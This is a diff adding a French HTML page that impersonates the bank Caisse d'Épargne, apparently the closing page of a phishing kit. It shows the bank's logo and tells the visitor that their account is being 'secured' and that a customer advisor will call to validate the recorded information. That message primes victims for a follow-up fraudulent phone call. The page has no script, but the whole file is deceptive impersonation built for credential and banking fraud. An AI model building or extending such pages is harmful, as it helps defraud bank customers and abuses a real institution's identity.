@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Merci - Caisse d'Épargne</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      color: #000;
+      position: relative;
+      overflow: hidden;
+    }
+    /* Image de fond avec opacité */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-image: url('https://storage.googleapis.com/endurance-apps-liip/media/cache/theming_channel_jumbotron_grid_fs/6426e12605dc778d9a039ab8');
+      background-repeat: no-repeat;
+      background-position: center center;
+      background-size: cover;
+      background-attachment: fixed;
+      opacity: 0.3; /* Ajuste l’opacité ici */
+      z-index: -1;
+    }
+    /* Overlay pour lisibilité */
+    .overlay {
+      background-color: rgba(255, 255, 255, 0.95);
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+    .header {
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+      background: rgba(255,255,255,0.95);
+      position: relative;
+      z-index: 2;
+    }
+    .header a {
+      text-decoration: none;
+      color: #c10000;
+      font-weight: bold;
+    }
+    .header img {
+      height: 36px;
+    }
+    h1 {
+      font-size: 24px;
+      color: #c10000;
+      margin-bottom: 20px;
+    }
+    .message {
+      max-width: 600px;
+      font-size: 16px;
+      line-height: 1.6;
+      color: #333;
+      background: #fff;
+      padding: 24px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+    }
+    .message strong {
+      color: #c10000;
+    }
+    @media (max-width: 480px) {
+      h1 { font-size: 20px; }
+      .message { font-size: 15px; padding: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <a href="#">Quitter</a>
+    <img src="https://ce-prod.cloudimg.io/_images_/app/uploads/sites/3/2022/02/17171235/logo-ce-desktop.jpg" alt="Logo" />
+    <a href="#" title="Assistance">?</a>
+  </div>
+
+  <div class="overlay">
+    <h1>Merci pour votre confiance</h1>
+    <div class="message">
+      La procédure de sécurisation de votre compte <strong>Caisse d'Épargne</strong> est en cours.<br /><br />
+      Un conseiller clientèle vous contactera par téléphone dans les plus brefs délais afin de valider les informations enregistrées et finaliser la protection de votre espace personnel.<br /><br />
+      Merci de votre réactivité et de votre collaboration.
+    </div>
+  </div>
+</body>
+</html>
